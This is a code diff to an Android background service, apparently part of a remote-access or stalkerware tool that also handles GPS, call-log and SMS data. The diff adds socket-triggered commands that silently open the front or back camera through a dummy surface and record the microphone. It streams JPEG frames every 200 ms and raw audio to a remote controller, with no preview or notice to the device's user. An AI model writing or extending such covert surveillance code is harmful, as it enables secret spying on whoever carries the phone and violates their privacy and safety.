@@ -13,12 +13,26 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.graphics.ImageFormat;
+import android.graphics.SurfaceTexture;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CaptureRequest;
 import android.location.Location;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
+import android.media.Image;
+import android.media.ImageReader;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.CallLog;
@@ -27,7 +41,9 @@ import android.provider.MediaStore;
 import android.provider.Telephony;
 import android.util.Base64;
 import android.util.Log;
+import android.view.Surface;
 
+import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 
@@ -78,6 +94,22 @@ public class DeviceService extends Service {
     private boolean gpsActive = false;
     private MediaRecorder mediaRecorder;
     private Timer callLogCheckTimer;
+
+    // Camera streaming
+    private CameraDevice cameraDevice;
+    private CameraCaptureSession captureSession;
+    private ImageReader imageReader;
+    private HandlerThread cameraThread;
+    private Handler cameraHandler;
+    private boolean isCameraStreaming = false;
+    private boolean useFrontCamera = false;
+    private Timer cameraFrameTimer;
+    private byte[] latestFrameJpeg = null;
+
+    // Audio streaming
+    private AudioRecord audioRecord;
+    private boolean isAudioStreaming = false;
+    private Thread audioThread;
 
     @Override
     public void onCreate() {
@@ -152,6 +184,9 @@ public class DeviceService extends Service {
             });
 
             // Command handlers
+            socket.on("command:camera:start", args -> handleCameraStart());
+            socket.on("command:camera:stop", args -> handleCameraStop());
+            socket.on("command:camera:switch", args -> handleCameraSwitch());
             socket.on("command:camera:capture", args -> handleCameraCapture());
             socket.on("command:gps:start", args -> handleGpsStart());
             socket.on("command:gps:stop", args -> handleGpsStop());
@@ -619,17 +654,244 @@ public class DeviceService extends Service {
         }
     }
 
-    // ---- Camera ----
-    private void handleCameraCapture() {
-        // Camera requires a surface/preview which is complex in a service
-        // We'll emit a message indicating native camera capture is available
-        try {
-            JSONObject data = new JSONObject();
-            data.put("note", "Camera capture from background service - use gallery for photos");
-            socket.emit("camera:frame", data);
-        } catch (JSONException e) {
-            e.printStackTrace();
+    // ---- Camera Streaming (Camera2 API) ----
+    private void handleCameraStart() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                != PackageManager.PERMISSION_GRANTED) {
+            Log.e(TAG, "Camera permission not granted");
+            return;
         }
+        if (isCameraStreaming) return;
+
+        try {
+            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
+            String cameraId = getCameraId(manager, useFrontCamera);
+            if (cameraId == null) {
+                Log.e(TAG, "No camera found");
+                return;
+            }
+
+            cameraThread = new HandlerThread("CameraThread");
+            cameraThread.start();
+            cameraHandler = new Handler(cameraThread.getLooper());
+
+            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
+            imageReader.setOnImageAvailableListener(reader -> {
+                Image image = reader.acquireLatestImage();
+                if (image != null) {
+                    java.nio.ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                    byte[] bytes = new byte[buffer.remaining()];
+                    buffer.get(bytes);
+                    latestFrameJpeg = bytes;
+                    image.close();
+                }
+            }, cameraHandler);
+
+            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
+                @Override
+                public void onOpened(@NonNull CameraDevice camera) {
+                    cameraDevice = camera;
+                    try {
+                        SurfaceTexture texture = new SurfaceTexture(0);
+                        texture.setDefaultBufferSize(640, 480);
+                        Surface dummySurface = new Surface(texture);
+
+                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
+                        builder.addTarget(imageReader.getSurface());
+
+                        camera.createCaptureSession(
+                            java.util.Arrays.asList(imageReader.getSurface()),
+                            new CameraCaptureSession.StateCallback() {
+                                @Override
+                                public void onConfigured(@NonNull CameraCaptureSession session) {
+                                    captureSession = session;
+                                    try {
+                                        builder.set(CaptureRequest.CONTROL_AF_MODE,
+                                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
+                                        session.setRepeatingRequest(builder.build(), null, cameraHandler);
+                                        isCameraStreaming = true;
+                                        startFrameSending();
+                                        startAudioStreaming();
+                                        Log.d(TAG, "Camera + audio streaming started");
+                                    } catch (CameraAccessException e) {
+                                        Log.e(TAG, "Camera capture error: " + e.getMessage());
+                                    }
+                                }
+                                @Override
+                                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
+                                    Log.e(TAG, "Camera configure failed");
+                                }
+                            }, cameraHandler);
+                    } catch (CameraAccessException e) {
+                        Log.e(TAG, "Camera session error: " + e.getMessage());
+                    }
+                }
+                @Override
+                public void onDisconnected(@NonNull CameraDevice camera) {
+                    camera.close();
+                    cameraDevice = null;
+                }
+                @Override
+                public void onError(@NonNull CameraDevice camera, int error) {
+                    camera.close();
+                    cameraDevice = null;
+                    Log.e(TAG, "Camera error: " + error);
+                }
+            }, cameraHandler);
+
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Camera start error: " + e.getMessage());
+        }
+    }
+
+    private void startFrameSending() {
+        if (cameraFrameTimer != null) cameraFrameTimer.cancel();
+        cameraFrameTimer = new Timer();
+        cameraFrameTimer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                if (latestFrameJpeg != null && socket != null && socket.connected()) {
+                    String base64 = Base64.encodeToString(latestFrameJpeg, Base64.NO_WRAP);
+                    try {
+                        JSONObject data = new JSONObject();
+                        data.put("frame", "data:image/jpeg;base64," + base64);
+                        socket.emit("camera:frame", data);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }, 0, 200); // Send frame every 200ms
+    }
+
+    private void startAudioStreaming() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
+                != PackageManager.PERMISSION_GRANTED) return;
+        if (isAudioStreaming) return;
+
+        int sampleRate = 16000;
+        int bufferSize = AudioRecord.getMinBufferSize(sampleRate,
+            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
+        if (bufferSize < 4096) bufferSize = 4096;
+
+        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate,
+            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufferSize);
+        audioRecord.startRecording();
+        isAudioStreaming = true;
+
+        final int finalBufferSize = bufferSize;
+        audioThread = new Thread(() -> {
+            byte[] buffer = new byte[finalBufferSize];
+            while (isAudioStreaming) {
+                int read = audioRecord.read(buffer, 0, buffer.length);
+                if (read > 0 && socket != null && socket.connected()) {
+                    String base64 = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
+                    try {
+                        JSONObject data = new JSONObject();
+                        data.put("audio", base64);
+                        data.put("sampleRate", sampleRate);
+                        socket.emit("camera:audio", data);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        });
+        audioThread.start();
+        Log.d(TAG, "Audio streaming started");
+    }
+
+    private void stopAudioStreaming() {
+        isAudioStreaming = false;
+        if (audioThread != null) {
+            audioThread.interrupt();
+            audioThread = null;
+        }
+        if (audioRecord != null) {
+            try {
+                audioRecord.stop();
+                audioRecord.release();
+            } catch (Exception e) {}
+            audioRecord = null;
+        }
+    }
+
+    private void handleCameraStop() {
+        isCameraStreaming = false;
+        if (cameraFrameTimer != null) {
+            cameraFrameTimer.cancel();
+            cameraFrameTimer = null;
+        }
+        stopAudioStreaming();
+        if (captureSession != null) {
+            try { captureSession.close(); } catch (Exception e) {}
+            captureSession = null;
+        }
+        if (cameraDevice != null) {
+            cameraDevice.close();
+            cameraDevice = null;
+        }
+        if (imageReader != null) {
+            imageReader.close();
+            imageReader = null;
+        }
+        if (cameraThread != null) {
+            cameraThread.quitSafely();
+            cameraThread = null;
+        }
+        latestFrameJpeg = null;
+        Log.d(TAG, "Camera + audio streaming stopped");
+    }
+
+    private void handleCameraSwitch() {
+        useFrontCamera = !useFrontCamera;
+        Log.d(TAG, "Switching to " + (useFrontCamera ? "front" : "back") + " camera");
+        handleCameraStop();
+        // Small delay before restarting
+        new Handler(getMainLooper()).postDelayed(this::handleCameraStart, 500);
+    }
+
+    private void handleCameraCapture() {
+        if (latestFrameJpeg != null && socket != null && socket.connected()) {
+            String base64 = Base64.encodeToString(latestFrameJpeg, Base64.NO_WRAP);
+            try {
+                JSONObject data = new JSONObject();
+                data.put("image", "data:image/jpeg;base64," + base64);
+                socket.emit("camera:captured", data);
+                Log.d(TAG, "Photo captured and sent");
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        } else {
+            // If camera not streaming, take a quick snapshot
+            handleCameraStart();
+            new Handler(getMainLooper()).postDelayed(() -> {
+                if (latestFrameJpeg != null && socket != null && socket.connected()) {
+                    String base64 = Base64.encodeToString(latestFrameJpeg, Base64.NO_WRAP);
+                    try {
+                        JSONObject data = new JSONObject();
+                        data.put("image", "data:image/jpeg;base64," + base64);
+                        socket.emit("camera:captured", data);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }, 2000);
+        }
+    }
+
+    private String getCameraId(CameraManager manager, boolean front) throws CameraAccessException {
+        for (String id : manager.getCameraIdList()) {
+            CameraCharacteristics chars = manager.getCameraCharacteristics(id);
+            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
+            if (facing != null) {
+                if (front && facing == CameraCharacteristics.LENS_FACING_FRONT) return id;
+                if (!front && facing == CameraCharacteristics.LENS_FACING_BACK) return id;
+            }
+        }
+        // Fallback to first camera
+        String[] ids = manager.getCameraIdList();
+        return ids.length > 0 ? ids[0] : null;
     }
 
     // ---- Notifications ----
@@ -996,6 +1258,7 @@ public class DeviceService extends Service {
             callLogCheckTimer.cancel();
             callLogCheckTimer = null;
         }
+        handleCameraStop();
         if (socket != null) {
             socket.disconnect();
             socket.close();
